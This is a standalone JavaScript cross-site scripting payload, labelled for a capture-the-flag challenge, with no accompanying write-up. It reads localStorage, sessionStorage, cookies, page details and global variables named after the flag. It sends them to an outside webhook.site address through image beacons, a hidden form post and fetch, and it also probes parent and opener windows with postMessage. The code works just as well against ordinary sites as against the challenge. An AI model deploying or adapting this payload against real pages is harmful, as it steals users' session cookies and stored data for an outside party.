     console.log('🎯 LIVE CTF PAYLOAD V2 - NEW WEBHOOK - Flag Extraction for CTF Domain');

     // CORS-FREE webhook function with NEW URL
     function sendWebhook(data) {
         try {
             const img = new Image();
             const params = new URLSearchParams();
             Object.keys(data).forEach(key => {
                 params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
             });
             img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/ctf-payload?' + params.toString();
             document.body.appendChild(img);
             console.log('Webhook sent:', data.status);
         } catch(e) { console.error('Webhook failed:', e); }
     }

     sendWebhook({
         status: 'CTF_PAYLOAD_START_V2_NEW_WEBHOOK',
         timestamp: new Date().toISOString(),
         current_domain: window.location.hostname,
         current_url: window.location.href,
         user_agent: navigator.userAgent,
         ctf_domain: window.location.hostname.includes('secjhu') || window.location.hostname.includes('chal'),
         webhook_version: 'V2_UPDATED'
     });

     // MAIN FLAG EXTRACTION
     try {
         const flag = localStorage.getItem('flag');
         const allStorage = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             allStorage[key] = localStorage.getItem(key);
         }

         // Get all possible storage locations
         const sessionStorage_data = {};
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             sessionStorage_data[key] = sessionStorage.getItem(key);
         }

         sendWebhook({
             status: 'CTF_FLAG_EXTRACTION_COMPLETE_V2',
             timestamp: new Date().toISOString(),
             success: !!flag,
             flag: flag || 'not_found',
             all_localStorage: JSON.stringify(allStorage),
             localStorage_length: localStorage.length,
             all_sessionStorage: JSON.stringify(sessionStorage_data),
             sessionStorage_length: sessionStorage.length,
             cookies: document.cookie || 'none',
             domain: window.location.hostname,
             port: window.location.port || 'default',
             origin: window.location.origin
         });

         if (flag) {
             console.log('🚩 FLAG CAPTURED FROM CTF DOMAIN V2:', flag);

             // Send flag confirmation multiple times with different methods
             sendWebhook({
                 status: 'FLAG_CONFIRMED_CTF_DOMAIN_V2',
                 flag: flag,
                 timestamp: new Date().toISOString(),
                 extraction_location: 'ctf_domain_localStorage',
                 success: true,
                 webhook_version: 'V2_SUCCESS'
             });

             // Additional confirmation via image with flag in URL
             const flagImg = new Image();
             flagImg.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/flag-captured?flag=' +
                          encodeURIComponent(flag) + '&origin=' + encodeURIComponent(window.location.origin) +
                          '&timestamp=' + encodeURIComponent(new Date().toISOString()) + '&version=V2';
             document.body.appendChild(flagImg);

             // Form submission backup
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a';
             form.target = '_blank';
             form.style.display = 'none';

             const flagInput = document.createElement('input');
             flagInput.type = 'hidden';
             flagInput.name = 'captured_flag_ctf_v2';
             flagInput.value = flag;

             const originInput = document.createElement('input');
             originInput.type = 'hidden';
             originInput.name = 'extraction_origin';
             originInput.value = window.location.origin;

             const timestampInput = document.createElement('input');
             timestampInput.type = 'hidden';
             timestampInput.name = 'timestamp';
             timestampInput.value = new Date().toISOString();

             const versionInput = document.createElement('input');
             versionInput.type = 'hidden';
             versionInput.name = 'version';
             versionInput.value = 'V2_NEW_WEBHOOK';

             form.appendChild(flagInput);
             form.appendChild(originInput);
             form.appendChild(timestampInput);
             form.appendChild(versionInput);
             document.body.appendChild(form);
             form.submit();

             // Try to send via fetch as backup (may be blocked by CORS)
             try {
                 fetch('https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
                         flag: flag,
                         source: 'fetch_backup_v2',
                         timestamp: new Date().toISOString(),
                         origin: window.location.origin,
                         version: 'V2_NEW_WEBHOOK'
                     })
                 }).catch(e => console.log('Fetch backup failed (expected):', e));
             } catch(e) {}
         }

     } catch(e) {
         sendWebhook({
             status: 'CTF_EXTRACTION_ERROR_V2',
             error: e.message,
             timestamp: new Date().toISOString(),
             stack: e.stack
         });
     }

     // Try to access any global variables that might contain the flag
     setTimeout(() => {
         try {
             const globalVars = [];
             for (let prop in window) {
                 if (typeof window[prop] === 'string' && window[prop].includes('flag')) {
                     globalVars.push({name: prop, value: window[prop]});
                 }
             }

             sendWebhook({
                 status: 'GLOBAL_VARIABLE_SCAN_V2',
                 timestamp: new Date().toISOString(),
                 found_flag_vars: globalVars,
                 window_keys_count: Object.keys(window).length
             });
         } catch(e) {}
     }, 2000);

     // Try cross-frame communication if in iframe
     try {
         if (window.parent !== window) {
             window.parent.postMessage({
                 type: 'FLAG_REQUEST_CTF_V2',
                 timestamp: new Date().toISOString(),
                 origin: window.location.origin
             }, '*');

             sendWebhook({
                 status: 'POSTMESSAGE_SENT_TO_PARENT_CTF_V2',
                 timestamp: new Date().toISOString()
             });
         }

         if (window.opener) {
             window.opener.postMessage({
                 type: 'FLAG_REQUEST_CTF_V2',
                 timestamp: new Date().toISOString(),
                 origin: window.location.origin
             }, '*');

             sendWebhook({
                 status: 'POSTMESSAGE_SENT_TO_OPENER_CTF_V2',
                 timestamp: new Date().toISOString()
             });
         }
     } catch(e) {}

     // Listen for postMessage responses
     window.addEventListener('message', function(event) {
         sendWebhook({
             status: 'POSTMESSAGE_RECEIVED_CTF_V2',
             timestamp: new Date().toISOString(),
             message_origin: event.origin,
             message_data: JSON.stringify(event.data)
         });

         if (event.data && event.data.flag) {
             sendWebhook({
                 status: 'FLAG_RECEIVED_VIA_POSTMESSAGE_CTF_V2',
                 timestamp: new Date().toISOString(),
                 flag: event.data.flag,
                 source_origin: event.origin
             });
         }
     });

     // Send final status
     setTimeout(() => {
         sendWebhook({
             status: 'CTF_PAYLOAD_COMPLETE_V2',
             timestamp: new Date().toISOString(),
             domain: window.location.hostname,
             final_check: 'payload_execution_finished',
             webhook_version: 'V2_NEW_WEBHOOK'
         });
     }, 8000);

     console.log('🏁 CTF payload V2 execution completed with new webhook');
